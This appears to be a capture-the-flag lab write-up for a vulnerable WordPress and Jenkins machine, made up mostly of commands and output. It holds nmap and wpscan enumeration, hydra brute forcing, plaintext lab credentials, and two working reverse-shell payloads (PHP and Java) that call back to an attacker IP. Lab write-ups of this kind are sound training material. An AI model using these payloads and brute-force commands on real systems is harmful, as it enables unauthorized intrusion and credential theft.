## nmap -sVC -A 10.10.15.236
```
Nmap scan report for 10.10.15.236
Host is up (0.40s latency).
Not shown: 997 closed ports
PORT   STATE    SERVICE VERSION
22/tcp open     ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 6e:fa:ef:be:f6:5f:98:b9:59:7b:f7:8e:b9:c5:62:1e (RSA)
|   256 ed:64:ed:33:e5:c9:30:58:ba:23:04:0d:14:eb:30:e9 (ECDSA)
|_  256 b0:7f:7f:7b:52:62:62:2a:60:d4:3d:36:fa:89:ee:ff (ED25519)
53/tcp filtered domain
80/tcp open     http    Apache httpd 2.4.29 ((Ubuntu))
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: Apache2 Ubuntu Default Page: It works
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.80%E=4%D=2/28%OT=22%CT=1%CU=38955%PV=Y%DS=4%DC=T%G=Y%TM=621CB7D
OS:E%P=x86_64-pc-linux-gnu)SEQ(SP=FB%GCD=1%ISR=10A%TI=Z%CI=Z%TS=A)SEQ(SP=FB
OS:%GCD=1%ISR=109%TI=Z%CI=Z%II=I%TS=A)OPS(O1=M508ST11NW7%O2=M508ST11NW7%O3=
OS:M508NNT11NW7%O4=M508ST11NW7%O5=M508ST11NW7%O6=M508ST11)WIN(W1=F4B3%W2=F4
OS:B3%W3=F4B3%W4=F4B3%W5=F4B3%W6=F4B3)ECN(R=Y%DF=Y%T=40%W=F507%O=M508NNSNW7
OS:%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=AS%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=
OS:Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%
OS:RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=0
OS:%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N%T=40%IPL=164%UN=0%RIPL=G%RID=G%RIP
OS:CK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%CD=S)

Network Distance: 4 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 554/tcp)
HOP RTT       ADDRESS
1   212.64 ms 10.2.0.1
2   ... 3
4   341.82 ms 10.10.15.236

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 87.60 seconds
```
## dirbuster
```
/phpmyadmin/
/blog/wp-login.php/
/phpmyadmin/index.php/
/wordpress/wp-login.php/
/blog
```
## wpscan --url http://10.10.15.236/blog --enumerate u
```
[i] User(s) Identified:

[+] admin
 | Found By: Author Id Brute Forcing - Author Pattern (Aggressive Detection)
 | Confirmed By: Login Error Messages (Aggressive Detection)
```

## wpscan --url http://10.10.15.236/blog -P /usr/share/wordlists/rockyou.txt -U admin
```
 | Username: admin, Password: my2boys
```

## WP Reverse Shell
```
$sock=fsockopen("10.2.92.176",5555);exec("/bin/sh -i <&3 >&3 2>&3");
```

## cat wp-save.txt
```
Bill,

Aubreanna needed these credentials for something later.  Let her know you have them and where they are.

aubreanna:bubb13guM!@#123
```

## cat user.txt 
```
flag 
```

## cat jenkins.txt
```
Internal Jenkins service is running on 172.17.0.2:8080
```

## ss -tulpn
```
Netid State   Recv-Q  Send-Q         Local Address:Port      Peer Address:Port  
udp   UNCONN  0       0              127.0.0.53%lo:53             0.0.0.0:*     
udp   UNCONN  0       0         10.10.15.236%eth0:68             0.0.0.0:*     
tcp   LISTEN  0       5                    0.0.0.0:8000           0.0.0.0:*     
tcp   LISTEN  0       80                 127.0.0.1:3306           0.0.0.0:*     
tcp   LISTEN  0       128                127.0.0.1:8080           0.0.0.0:*     
tcp   LISTEN  0       128                127.0.0.1:40369          0.0.0.0:*     
tcp   LISTEN  0       128            127.0.0.53%lo:53             0.0.0.0:*     
tcp   LISTEN  0       128                  0.0.0.0:22             0.0.0.0:*     
tcp   LISTEN  0       128                        *:80                   *:*     
tcp   LISTEN  0       128                     [::]:22                [::]:* 
```

## SSH Tunneling
```
ssh -L 4444:localhost:8080 aubreanna@10.10.15.236
```

## Cracking Jenkins login 
```
hydra -l admin -P /usr/share/wordlists/rockyou.txt 127.0.0.1 -s 4444 http-post-form '/j_acegi_security_check:j_username=^USER^&j_password=^PASS^&from=%2F&Submit=Sign+in:Invalid'
```
```
[4444][http-post-form] host: 127.0.0.1   login: admin   password: spongebob
```
## Jenkins Reverse shell
```
String host="10.2.92.176";int port=5555;String cmd="/bin/bash";Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new Socket(host,port);InputStream pi=p.getInputStream(),pe=p.getErrorStream(), si=s.getInputStream();OutputStream po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){while(pi.available()>0)so.write(pi.read());while(pe.available()>0)so.write(pe.read());while(si.available()>0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try {p.exitValue();break;}catch (Exception e){}};p.destroy();s.close();
```


## cat /opt/notes.txt
```
root:tr0ub13guM!@#123
```

## ssh admin@10.10.15.236


## # cat root.txt 
```
THM{d0ck3r_d3str0y3r}
```
